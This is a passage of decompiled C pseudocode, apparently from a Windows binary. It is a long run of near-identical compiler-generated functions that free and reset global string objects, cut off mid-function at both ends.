    v0 = dword_4F9F40;
    if ( (unsigned int)(dword_4F9F54 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9F40 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9F40 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F50 = 0;
  dword_4F9F54 = 15;
  LOBYTE(dword_4F9F40) = 0;
}
// 4F9F50: using guessed type int dword_4F9F50;
// 4F9F54: using guessed type int dword_4F9F54;

//----- (0048C4E0) --------------------------------------------------------
void __cdecl sub_48C4E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA044 >= 0x10 )
  {
    v0 = dword_4FA030;
    if ( (unsigned int)(dword_4FA044 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA030 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA030 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA040 = 0;
  dword_4FA044 = 15;
  LOBYTE(dword_4FA030) = 0;
}
// 4FA040: using guessed type int dword_4FA040;
// 4FA044: using guessed type int dword_4FA044;

//----- (0048C540) --------------------------------------------------------
void __cdecl sub_48C540()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9EDC >= 0x10 )
  {
    v0 = dword_4F9EC8;
    if ( (unsigned int)(dword_4F9EDC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9EC8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9EC8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9ED8 = 0;
  dword_4F9EDC = 15;
  LOBYTE(dword_4F9EC8) = 0;
}
// 4F9ED8: using guessed type int dword_4F9ED8;
// 4F9EDC: using guessed type int dword_4F9EDC;

//----- (0048C5A0) --------------------------------------------------------
void __cdecl sub_48C5A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9FCC >= 0x10 )
  {
    v0 = dword_4F9FB8;
    if ( (unsigned int)(dword_4F9FCC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9FB8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9FB8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9FC8 = 0;
  dword_4F9FCC = 15;
  LOBYTE(dword_4F9FB8) = 0;
}
// 4F9FC8: using guessed type int dword_4F9FC8;
// 4F9FCC: using guessed type int dword_4F9FCC;

//----- (0048C600) --------------------------------------------------------
void __cdecl sub_48C600()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E04 >= 0x10 )
  {
    v0 = dword_4F9DF0;
    if ( (unsigned int)(dword_4F9E04 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9DF0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9DF0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E00 = 0;
  dword_4F9E04 = 15;
  LOBYTE(dword_4F9DF0) = 0;
}
// 4F9E00: using guessed type int dword_4F9E00;
// 4F9E04: using guessed type int dword_4F9E04;

//----- (0048C660) --------------------------------------------------------
void __cdecl sub_48C660()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E1C >= 0x10 )
  {
    v0 = dword_4F9E08;
    if ( (unsigned int)(dword_4F9E1C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E08 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E08 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E18 = 0;
  dword_4F9E1C = 15;
  LOBYTE(dword_4F9E08) = 0;
}
// 4F9E18: using guessed type int dword_4F9E18;
// 4F9E1C: using guessed type int dword_4F9E1C;

//----- (0048C6C0) --------------------------------------------------------
void __cdecl sub_48C6C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA074 >= 0x10 )
  {
    v0 = dword_4FA060;
    if ( (unsigned int)(dword_4FA074 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA060 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA060 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA070 = 0;
  dword_4FA074 = 15;
  LOBYTE(dword_4FA060) = 0;
}
// 4FA070: using guessed type int dword_4FA070;
// 4FA074: using guessed type int dword_4FA074;

//----- (0048C720) --------------------------------------------------------
void __cdecl sub_48C720()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA014 >= 0x10 )
  {
    v0 = dword_4FA000;
    if ( (unsigned int)(dword_4FA014 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA000 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA000 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA010 = 0;
  dword_4FA014 = 15;
  LOBYTE(dword_4FA000) = 0;
}
// 4FA010: using guessed type int dword_4FA010;
// 4FA014: using guessed type int dword_4FA014;

//----- (0048C780) --------------------------------------------------------
void __cdecl sub_48C780()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9CE4 >= 0x10 )
  {
    v0 = dword_4F9CD0;
    if ( (unsigned int)(dword_4F9CE4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9CD0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9CD0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9CE0 = 0;
  dword_4F9CE4 = 15;
  LOBYTE(dword_4F9CD0) = 0;
}
// 4F9CE0: using guessed type int dword_4F9CE0;
// 4F9CE4: using guessed type int dword_4F9CE4;

//----- (0048C7E0) --------------------------------------------------------
void __cdecl sub_48C7E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F3C >= 0x10 )
  {
    v0 = dword_4F9F28;
    if ( (unsigned int)(dword_4F9F3C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9F28 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9F28 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F38 = 0;
  dword_4F9F3C = 15;
  LOBYTE(dword_4F9F28) = 0;
}
// 4F9F38: using guessed type int dword_4F9F38;
// 4F9F3C: using guessed type int dword_4F9F3C;

//----- (0048C840) --------------------------------------------------------
void __cdecl sub_48C840()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9EF4 >= 0x10 )
  {
    v0 = dword_4F9EE0;
    if ( (unsigned int)(dword_4F9EF4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9EE0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9EE0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9EF0 = 0;
  dword_4F9EF4 = 15;
  LOBYTE(dword_4F9EE0) = 0;
}
// 4F9EF0: using guessed type int dword_4F9EF0;
// 4F9EF4: using guessed type int dword_4F9EF4;

//----- (0048C8A0) --------------------------------------------------------
void __cdecl sub_48C8A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA104 >= 0x10 )
  {
    v0 = dword_4FA0F0;
    if ( (unsigned int)(dword_4FA104 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA0F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA0F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA100 = 0;
  dword_4FA104 = 15;
  LOBYTE(dword_4FA0F0) = 0;
}
// 4FA104: using guessed type int dword_4FA104;

//----- (0048C900) --------------------------------------------------------
void __cdecl sub_48C900()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA44C >= 0x10 )
  {
    v0 = dword_4FA438;
    if ( (unsigned int)(dword_4FA44C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA438 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA438 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA448 = 0;
  dword_4FA44C = 15;
  LOBYTE(dword_4FA438) = 0;
}
// 4FA448: using guessed type int dword_4FA448;
// 4FA44C: using guessed type int dword_4FA44C;

//----- (0048C960) --------------------------------------------------------
void __cdecl sub_48C960()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA284 >= 0x10 )
  {
    v0 = dword_4FA270;
    if ( (unsigned int)(dword_4FA284 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA270 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA270 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA280 = 0;
  dword_4FA284 = 15;
  LOBYTE(dword_4FA270) = 0;
}
// 4FA280: using guessed type int dword_4FA280;
// 4FA284: using guessed type int dword_4FA284;

//----- (0048C9C0) --------------------------------------------------------
void __cdecl sub_48C9C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA1C4 >= 0x10 )
  {
    v0 = dword_4FA1B0;
    if ( (unsigned int)(dword_4FA1C4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA1B0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA1B0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA1C0 = 0;
  dword_4FA1C4 = 15;
  LOBYTE(dword_4FA1B0) = 0;
}
// 4FA1C0: using guessed type int dword_4FA1C0;
// 4FA1C4: using guessed type int dword_4FA1C4;

//----- (0048CA20) --------------------------------------------------------
void __cdecl sub_48CA20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA344 >= 0x10 )
  {
    v0 = dword_4FA330;
    if ( (unsigned int)(dword_4FA344 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA330 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA330 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA340 = 0;
  dword_4FA344 = 15;
  LOBYTE(dword_4FA330) = 0;
}
// 4FA340: using guessed type int dword_4FA340;
// 4FA344: using guessed type int dword_4FA344;

//----- (0048CA80) --------------------------------------------------------
void __cdecl sub_48CA80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA494 >= 0x10 )
  {
    v0 = dword_4FA480;
    if ( (unsigned int)(dword_4FA494 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA480 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA480 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA490 = 0;
  dword_4FA494 = 15;
  LOBYTE(dword_4FA480) = 0;
}
// 4FA490: using guessed type int dword_4FA490;
// 4FA494: using guessed type int dword_4FA494;

//----- (0048CAE0) --------------------------------------------------------
void __cdecl sub_48CAE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA2CC >= 0x10 )
  {
    v0 = dword_4FA2B8;
    if ( (unsigned int)(dword_4FA2CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA2B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA2B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA2C8 = 0;
  dword_4FA2CC = 15;
  LOBYTE(dword_4FA2B8) = 0;
}
// 4FA2C8: using guessed type int dword_4FA2C8;
// 4FA2CC: using guessed type int dword_4FA2CC;

//----- (0048CB40) --------------------------------------------------------
void __cdecl sub_48CB40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA47C >= 0x10 )
  {
    v0 = dword_4FA468;
    if ( (unsigned int)(dword_4FA47C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA468 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA468 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA478 = 0;
  dword_4FA47C = 15;
  LOBYTE(dword_4FA468) = 0;
}
// 4FA478: using guessed type int dword_4FA478;
// 4FA47C: using guessed type int dword_4FA47C;

//----- (0048CBA0) --------------------------------------------------------
void __cdecl sub_48CBA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA2E4 >= 0x10 )
  {
    v0 = dword_4FA2D0;
    if ( (unsigned int)(dword_4FA2E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA2D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA2D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA2E0 = 0;
  dword_4FA2E4 = 15;
  LOBYTE(dword_4FA2D0) = 0;
}
// 4FA2E0: using guessed type int dword_4FA2E0;
// 4FA2E4: using guessed type int dword_4FA2E4;

//----- (0048CC00) --------------------------------------------------------
void __cdecl sub_48CC00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA4F4 >= 0x10 )
  {
    v0 = dword_4FA4E0;
    if ( (unsigned int)(dword_4FA4F4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA4E0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA4E0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA4F0 = 0;
  dword_4FA4F4 = 15;
  LOBYTE(dword_4FA4E0) = 0;
}
// 4FA4F0: using guessed type int dword_4FA4F0;
// 4FA4F4: using guessed type int dword_4FA4F4;

//----- (0048CC60) --------------------------------------------------------
void __cdecl sub_48CC60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA41C >= 0x10 )
  {
    v0 = dword_4FA408;
    if ( (unsigned int)(dword_4FA41C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA408 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA408 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA418 = 0;
  dword_4FA41C = 15;
  LOBYTE(dword_4FA408) = 0;
}
// 4FA418: using guessed type int dword_4FA418;
// 4FA41C: using guessed type int dword_4FA41C;

//----- (0048CCC0) --------------------------------------------------------
void __cdecl sub_48CCC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA56C >= 0x10 )
  {
    v0 = dword_4FA558;
    if ( (unsigned int)(dword_4FA56C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA558 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA558 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA568 = 0;
  dword_4FA56C = 15;
  LOBYTE(dword_4FA558) = 0;
}
// 4FA568: using guessed type int dword_4FA568;
// 4FA56C: using guessed type int dword_4FA56C;

//----- (0048CD20) --------------------------------------------------------
void __cdecl sub_48CD20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA3A4 >= 0x10 )
  {
    v0 = dword_4FA390;
    if ( (unsigned int)(dword_4FA3A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA390 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA390 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA3A0 = 0;
  dword_4FA3A4 = 15;
  LOBYTE(dword_4FA390) = 0;
}
// 4FA3A0: using guessed type int dword_4FA3A0;
// 4FA3A4: using guessed type int dword_4FA3A4;

//----- (0048CD80) --------------------------------------------------------
void __cdecl sub_48CD80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA2FC >= 0x10 )
  {
    v0 = dword_4FA2E8;
    if ( (unsigned int)(dword_4FA2FC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA2E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA2E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA2F8 = 0;
  dword_4FA2FC = 15;
  LOBYTE(dword_4FA2E8) = 0;
}
// 4FA2F8: using guessed type int dword_4FA2F8;
// 4FA2FC: using guessed type int dword_4FA2FC;

//----- (0048CDE0) --------------------------------------------------------
void __cdecl sub_48CDE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA314 >= 0x10 )
  {
    v0 = dword_4FA300;
    if ( (unsigned int)(dword_4FA314 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA300 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA300 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA310 = 0;
  dword_4FA314 = 15;
  LOBYTE(dword_4FA300) = 0;
}
// 4FA310: using guessed type int dword_4FA310;
// 4FA314: using guessed type int dword_4FA314;

//----- (0048CE40) --------------------------------------------------------
void __cdecl sub_48CE40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA1DC >= 0x10 )
  {
    v0 = dword_4FA1C8;
    if ( (unsigned int)(dword_4FA1DC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA1C8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA1C8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA1D8 = 0;
  dword_4FA1DC = 15;
  LOBYTE(dword_4FA1C8) = 0;
}
// 4FA1D8: using guessed type int dword_4FA1D8;
// 4FA1DC: using guessed type int dword_4FA1DC;

//----- (0048CEA0) --------------------------------------------------------
void __cdecl sub_48CEA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA35C >= 0x10 )
  {
    v0 = dword_4FA348;
    if ( (unsigned int)(dword_4FA35C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA348 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA348 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA358 = 0;
  dword_4FA35C = 15;
  LOBYTE(dword_4FA348) = 0;
}
// 4FA358: using guessed type int dword_4FA358;
// 4FA35C: using guessed type int dword_4FA35C;

//----- (0048CF00) --------------------------------------------------------
void __cdecl sub_48CF00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA3BC >= 0x10 )
  {
    v0 = dword_4FA3A8;
    if ( (unsigned int)(dword_4FA3BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA3A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA3A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA3B8 = 0;
  dword_4FA3BC = 15;
  LOBYTE(dword_4FA3A8) = 0;
}
// 4FA3B8: using guessed type int dword_4FA3B8;
// 4FA3BC: using guessed type int dword_4FA3BC;

//----- (0048CF60) --------------------------------------------------------
void __cdecl sub_48CF60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA434 >= 0x10 )
  {
    v0 = dword_4FA420;
    if ( (unsigned int)(dword_4FA434 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA420 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA420 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA430 = 0;
  dword_4FA434 = 15;
  LOBYTE(dword_4FA420) = 0;
}
// 4FA430: using guessed type int dword_4FA430;
// 4FA434: using guessed type int dword_4FA434;

//----- (0048CFC0) --------------------------------------------------------
void __cdecl sub_48CFC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA404 >= 0x10 )
  {
    v0 = dword_4FA3F0;
    if ( (unsigned int)(dword_4FA404 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA3F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA3F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA400 = 0;
  dword_4FA404 = 15;
  LOBYTE(dword_4FA3F0) = 0;
}
// 4FA400: using guessed type int dword_4FA400;
// 4FA404: using guessed type int dword_4FA404;

//----- (0048D020) --------------------------------------------------------
void __cdecl sub_48D020()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA26C >= 0x10 )
  {
    v0 = dword_4FA258;
    if ( (unsigned int)(dword_4FA26C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA258 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA258 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA268 = 0;
  dword_4FA26C = 15;
  LOBYTE(dword_4FA258) = 0;
}
// 4FA268: using guessed type int dword_4FA268;
// 4FA26C: using guessed type int dword_4FA26C;

//----- (0048D080) --------------------------------------------------------
void __cdecl sub_48D080()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA134 >= 0x10 )
  {
    v0 = dword_4FA120;
    if ( (unsigned int)(dword_4FA134 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA120 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA120 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA130 = 0;
  dword_4FA134 = 15;
  LOBYTE(dword_4FA120) = 0;
}
// 4FA130: using guessed type int dword_4FA130;
// 4FA134: using guessed type int dword_4FA134;

//----- (0048D0E0) --------------------------------------------------------
void __cdecl sub_48D0E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA194 >= 0x10 )
  {
    v0 = dword_4FA180;
    if ( (unsigned int)(dword_4FA194 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA180 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA180 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA190 = 0;
  dword_4FA194 = 15;
  LOBYTE(dword_4FA180) = 0;
}
// 4FA190: using guessed type int dword_4FA190;
// 4FA194: using guessed type int dword_4FA194;

//----- (0048D140) --------------------------------------------------------
void __cdecl sub_48D140()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA53C >= 0x10 )
  {
    v0 = dword_4FA528;
    if ( (unsigned int)(dword_4FA53C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA528 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA528 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA538 = 0;
  dword_4FA53C = 15;
  LOBYTE(dword_4FA528) = 0;
}
// 4FA538: using guessed type int dword_4FA538;
// 4FA53C: using guessed type int dword_4FA53C;

//----- (0048D1A0) --------------------------------------------------------
void __cdecl sub_48D1A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA524 >= 0x10 )
  {
    v0 = dword_4FA510;
    if ( (unsigned int)(dword_4FA524 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA510 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA510 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA520 = 0;
  dword_4FA524 = 15;
  LOBYTE(dword_4FA510) = 0;
}
// 4FA520: using guessed type int dword_4FA520;
// 4FA524: using guessed type int dword_4FA524;

//----- (0048D200) --------------------------------------------------------
void __cdecl sub_48D200()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA164 >= 0x10 )
  {
    v0 = dword_4FA150;
    if ( (unsigned int)(dword_4FA164 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA150 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA150 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA160 = 0;
  dword_4FA164 = 15;
  LOBYTE(dword_4FA150) = 0;
}
// 4FA160: using guessed type int dword_4FA160;
// 4FA164: using guessed type int dword_4FA164;

//----- (0048D260) --------------------------------------------------------
void __cdecl sub_48D260()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA32C >= 0x10 )
  {
    v0 = dword_4FA318;
    if ( (unsigned int)(dword_4FA32C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA318 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA318 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA328 = 0;
  dword_4FA32C = 15;
  LOBYTE(dword_4FA318) = 0;
}
// 4FA328: using guessed type int dword_4FA328;
// 4FA32C: using guessed type int dword_4FA32C;

//----- (0048D2C0) --------------------------------------------------------
void __cdecl sub_48D2C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA14C >= 0x10 )
  {
    v0 = dword_4FA138;
    if ( (unsigned int)(dword_4FA14C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA138 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA138 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA148 = 0;
  dword_4FA14C = 15;
  LOBYTE(dword_4FA138) = 0;
}
// 4FA148: using guessed type int dword_4FA148;
// 4FA14C: using guessed type int dword_4FA14C;

//----- (0048D320) --------------------------------------------------------
void __cdecl sub_48D320()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA4C4 >= 0x10 )
  {
    v0 = dword_4FA4B0;
    if ( (unsigned int)(dword_4FA4C4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA4B0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA4B0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA4C0 = 0;
  dword_4FA4C4 = 15;
  LOBYTE(dword_4FA4B0) = 0;
}
// 4FA4C0: using guessed type int dword_4FA4C0;
// 4FA4C4: using guessed type int dword_4FA4C4;

//----- (0048D380) --------------------------------------------------------
void __cdecl sub_48D380()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA1AC >= 0x10 )
  {
    v0 = dword_4FA198;
    if ( (unsigned int)(dword_4FA1AC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA198 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA198 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA1A8 = 0;
  dword_4FA1AC = 15;
  LOBYTE(dword_4FA198) = 0;
}
// 4FA1A8: using guessed type int dword_4FA1A8;
// 4FA1AC: using guessed type int dword_4FA1AC;

//----- (0048D3E0) --------------------------------------------------------
void __cdecl sub_48D3E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA224 >= 0x10 )
  {
    v0 = dword_4FA210;
    if ( (unsigned int)(dword_4FA224 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA210 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA210 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA220 = 0;
  dword_4FA224 = 15;
  LOBYTE(dword_4FA210) = 0;
}
// 4FA220: using guessed type int dword_4FA220;
// 4FA224: using guessed type int dword_4FA224;

//----- (0048D440) --------------------------------------------------------
void __cdecl sub_48D440()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA254 >= 0x10 )
  {
    v0 = dword_4FA240;
    if ( (unsigned int)(dword_4FA254 + 1) >= 0x1000 )
    {
